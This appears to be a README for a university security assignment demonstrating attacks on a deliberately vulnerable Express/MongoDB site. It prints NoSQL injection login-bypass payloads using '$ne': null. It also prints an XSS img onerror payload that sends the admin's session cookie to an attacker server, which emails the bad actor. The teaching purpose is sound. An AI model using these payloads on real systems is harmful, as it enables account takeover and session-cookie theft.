# ISEC3004-Assignment

## Introduction<br>

This is a repository for ISEC3004 Assignment. The assignment focuses on demostrating XSS and NoSQL Injection attacks.<br>
<br>
#### index.html - Main page for the website<br>
#### Backend - Backend Server
This backend acts as a server for the website. It is written in JavasScript using NodeJS runtime environment and ExpressJS framework. It uses MongoDB as the database.<br>
To run the backend server, navigate to the directory and run the following commands:<br>
  
```console
npm install
nodemon index.js
```
<b>Make sure to replace the mongoose.connect the URL with your mongoDB URL by specifying MONGO_URL value in .env file.</b>

#### EvilBackend - Backend Server for Blind XSS<br>
This backend acts as the server used by the bad actor to hunt for sesstion cookies. It is written in JavasScript using NodeJS runtime environment and ExpressJS framework.<br>
To run the backend server, navigate to the directory and run the following commands:<be>

```console 
npm install
nodemon index.js
```
<b>Make sure to specify EMAIL_TOKEN, EMAIL_FROM, EMAIL_TO, EMAIL_PASSWORD values in .env file.</b>

***

#### NoSql - NoSQL Injection Attack<br>
1. A bad actor can use the following payload to login as a different user if the email is known.<br>

```console
"password": {"$ne": null}
```
<br>
2. If the email is unknown the following payload will log you in as the first user in the database (In most cases the admin) <br>

```console
"email": {"$ne": null}, "password": {"$ne": null}
```
<br>

In the above scenarios, {"$ne": null} means <b>not equal to null</b>.

#### XSS - XSS Attack <br>
When a user account is created with a XSS payload as the user such as: <br>

```console 
<img src="invalid-url" onerror="this.src='http://localhost:5001/hack?cookie='+document.cookie; this.removeAttribute('onerror');"></img>
```
<br>
The payload will be executed when the Administrator of the system loads the admin page. The invalid source url will cause an error and execute the XSS payload in onerror attribute. The payload will send the session cookie to the bad actor's server. The EvilBackend server will then display the session cookie on the page and send a Email to the bad actor as a notification.<br>
